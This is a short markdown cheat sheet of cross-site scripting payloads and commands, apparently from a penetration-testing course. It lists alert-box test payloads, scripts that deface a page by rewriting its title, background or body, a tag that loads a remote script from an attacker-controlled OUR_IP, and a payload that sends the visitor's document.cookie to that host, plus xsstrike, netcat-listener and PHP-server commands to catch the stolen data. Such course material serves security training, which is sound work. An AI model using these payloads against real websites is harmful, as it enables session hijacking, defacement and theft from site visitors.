## XSS

| Code                                                                                          | Description                       |
| --------------------------------------------------------------------------------------------- | --------------------------------- |
| **XSS Payloads**                                                                              |                                   |
| `<script>alert(window.origin)</script>`                                                       | Basic XSS Payload                 |
| `<plaintext>`                                                                                 | Basic XSS Payload                 |
| `<script>print()</script>`                                                                    | Basic XSS Payload                 |
| `<img src="" onerror=alert(window.origin)>`                                                   | HTML-based XSS Payload            |
| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color           |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image           |
| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title              |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite website's main body     |
| `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element       |
| `<script src="http://OUR_IP/script.js"></script>`                                             | Load remote script                |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | Send Cookie details to us         |
| **Commands**                                                                                  |                                   |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`                           | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80`                                                                            | Start `netcat` listener           |
| `sudo php -S 0.0.0.0:80`                                                                      | Start `PHP` server                |